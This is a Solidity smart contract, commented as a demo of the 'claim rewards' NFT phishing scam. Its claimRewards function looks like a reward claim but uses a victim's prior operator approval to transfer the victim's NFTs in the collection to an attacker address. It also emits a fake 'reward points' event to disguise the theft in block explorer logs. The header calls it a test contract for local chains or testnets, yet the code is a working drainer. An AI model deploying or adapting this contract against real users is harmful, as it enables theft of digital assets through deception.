// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITestNFT {
    function nextTokenId() external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

/**
 * @title FakeNFTRewards
 * @notice Demo drainer for the classic "claim rewards" phishing flow.
 *
 * Step 1, "Verify eligibility": the phishing site asks the victim to call
 *         `setApprovalForAll(FakeNFTRewards, true)` on their NFT collection.
 * Step 2, "Claim rewards": the victim calls `claimRewards()`, which pays nothing and instead
 *         moves every NFT the victim owns in that collection to the attacker.
 *
 * TEST CONTRACT ONLY. Deploy to a local chain or a testnet, never to mainnet.
 */
contract FakeNFTRewards {
    /// Newest token ids scanned per call; keeps gas bounded on a public testnet collection.
    uint256 public constant SCAN_WINDOW = 256;

    address public immutable attacker;
    ITestNFT public immutable collection;

    event RewardsClaimed(address indexed victim, uint256 rewardPoints);

    constructor(address _attacker, address _collection) {
        attacker = _attacker;
        collection = ITestNFT(_collection);
    }

    /// @notice Looks like a reward claim. Actually sweeps the caller's NFTs to the attacker.
    function claimRewards() external returns (uint256 swept) {
        if (!collection.isApprovedForAll(msg.sender, address(this))) {
            emit RewardsClaimed(msg.sender, 0);
            return 0;
        }
        uint256 last = collection.nextTokenId();
        uint256 first = last > SCAN_WINDOW ? last - SCAN_WINDOW : 1;
        for (uint256 id = first; id < last; id++) {
            if (collection.ownerOf(id) == msg.sender) {
                collection.transferFrom(msg.sender, attacker, id);
                swept++;
            }
        }
        // The event claims "reward points" so block explorers show an innocent-looking log.
        emit RewardsClaimed(msg.sender, swept * 100);
    }
}
